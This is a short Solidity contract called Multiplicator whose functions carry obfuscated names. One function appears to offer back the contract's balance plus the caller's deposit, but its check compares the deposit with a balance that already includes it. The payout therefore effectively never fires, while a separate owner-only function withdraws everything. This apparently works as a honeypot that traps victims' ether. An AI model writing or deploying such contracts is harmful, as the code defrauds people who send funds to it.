// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function _0xee39f2()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function _0x939147(address _0xd4225a)
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xd4225a.transfer(this.balance+msg.value);
        }
    }
}